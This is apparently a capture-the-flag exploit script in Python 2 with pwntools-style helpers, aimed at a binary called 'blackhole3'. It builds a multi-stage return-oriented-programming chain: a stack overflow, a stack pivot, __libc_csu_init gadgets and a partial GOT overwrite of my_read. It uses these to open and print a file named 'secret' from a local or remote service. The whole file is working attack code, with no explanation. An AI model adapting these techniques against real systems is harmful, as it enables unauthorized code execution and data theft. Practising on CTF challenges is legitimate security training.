#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './blackhole3'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'blackhole3_libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_plt_my_read    = binf.plt['my_read']
addr_plt_main       = binf.plt['__libc_start_main']
addr_got_my_read    = binf.got['my_read']

addr_data           = binf.symbols['data']
addr_stack          = addr_data + 0x800

addr_stkof          = binf.sep_function['stkof']
addr_csu_init       = binf.sep_function['__libc_csu_init']
addr_csu_init_1     = addr_csu_init + 0x5a
addr_csu_init_2     = addr_csu_init + 0x40

addr_rsp_pop3       = 0x0040076d        # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
addr_pop4           = 0x0040076c        # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
addr_pop6           = 0x0040076a        # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;
addr_call_rbp       = 0x004006c5        # call qword [rbp+0x48]


libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_read        = libc.sep_function['read']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)

    exploit_1  = 'a'*0x20
    exploit_1 += p64(addr_stack - 8)
    exploit_1 += p64(rop.rsi_r15.address)
    exploit_1 += p64(addr_stack - 0x80)
    exploit_1 += p64(0xdeadbeef)
    exploit_1 += p64(addr_plt_my_read)

    exploit_1 += p64(rop.rsi_r15.address)
    exploit_1 += p64(addr_stack + 0x180)
    exploit_1 += p64(0xdeadbeef)
    exploit_1 += p64(addr_plt_my_read)
    exploit_1 += p64(rop.leave.address)
    # raw_input('1')
    # conn.send(exploit_1.ljust(0x100))

    exploit_2  = p64(addr_csu_init_1)
    exploit_2 += p64(0)
    exploit_2 += p64(1)
    exploit_2 += p64(addr_stack - 0x80 + 0xf8)
    exploit_2 += p64(addr_stack + 0x40 - 8*3)
    exploit_2 += p64(0xcafebabe)
    exploit_2 += p64(rop.rdi.address)
    exploit_2 += p64(addr_csu_init_2)
    print hex(0xb8 - len(exploit_2))

    exploit_2 += p64(addr_plt_my_read)
    exploit_2 += p64(addr_rsp_pop3)
    exploit_2 += p64(addr_stack + 0x180 - 8*3)
    # raw_input('2')
    # conn.send((p64(addr_rsp_pop3) + 'a'*0x78 + exploit_2).ljust(0xf8)+p64(addr_plt_main))

    exploit_3  = p64(addr_csu_init_1)
    exploit_3 += p64(0)
    exploit_3 += p64(1)
    exploit_3 += p64(addr_got_my_read)
    exploit_3 += p64(8)
    exploit_3 += p64(addr_data)
    exploit_3 += p64(constants.STDIN_FILENO)
    exploit_3 += p64(addr_csu_init_2)
    exploit_3 += p64(0xdeadbeef)

    exploit_3 += p64(0)
    exploit_3 += p64(1)
    exploit_3 += p64(addr_got_my_read)
    exploit_3 += p64(2)                        # set rax = 2
    exploit_3 += p64(addr_stack + 0x40 - 1)
    exploit_3 += p64(constants.STDIN_FILENO)
    exploit_3 += p64(addr_csu_init_2)
    exploit_3 += p64(0xdeadbeef)
    exploit_3 += p64(0xdeadbeef)
    exploit_3 += p64(addr_stack + 0x40 - 0x48)
    exploit_3 += p64(0xdeadbeef)
    exploit_3 += p64(0xdeadbeef)
    exploit_3 += p64(0xdeadbeef)
    exploit_3 += p64(0xdeadbeef)

    exploit_3 += p64(rop.rdi.address)
    exploit_3 += p64(addr_data)
    exploit_3 += p64(rop.rsi_r15.address)
    exploit_3 += p64(0)
    exploit_3 += p64(0xdeadbeef)
    exploit_3 += p64(addr_call_rbp)

    exploit_3 += p64(addr_stkof)
    # raw_input('3')
    # conn.send(exploit_3.ljust(0x100))

    # raw_input('4')
    # conn.send('secret'.ljust(8, '\x00'))
    # raw_input('5')
    # conn.send('\xff'+chr((offset_libc_read & 0xff) + 0xe))

    exploit_4  = 'd'*0x28
    exploit_4 += p64(addr_csu_init_1)
    exploit_4 += p64(0)
    exploit_4 += p64(1)
    exploit_4 += p64(addr_got_my_read)
    exploit_4 += p64(0x400)
    exploit_4 += p64(addr_data)
    exploit_4 += p64(3)
    exploit_4 += p64(addr_csu_init_2)
    exploit_4 += p64(0xdeadbeef) * 7

    exploit_4 += p64(addr_stkof)

    exploit_4 += p64(addr_csu_init_1)
    exploit_4 += p64(0)
    exploit_4 += p64(1)
    exploit_4 += p64(addr_stack + 0x40)
    exploit_4 += p64(0x400)
    exploit_4 += p64(addr_data)
    exploit_4 += p64(constants.STDOUT_FILENO)
    exploit_4 += p64(addr_csu_init_2)

    # raw_input('6')
    # conn.send(exploit_4.ljust(0x100))
    # conn.send('\xff')

    exploit  = exploit_1.ljust(0x100)
    exploit += (p64(addr_rsp_pop3) + 'a'*0x78 + exploit_2).ljust(0xf8)+p64(addr_plt_main)
    exploit += exploit_3.ljust(0x100)
    exploit += 'secret'.ljust(8, '\x00')
    exploit += '\xff'+chr((offset_libc_read & 0xff) + 0xe)
    exploit += exploit_4.ljust(0x100)
    exploit += '\xff'
    conn.send(exploit)
    print exploit.encode('hex')

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
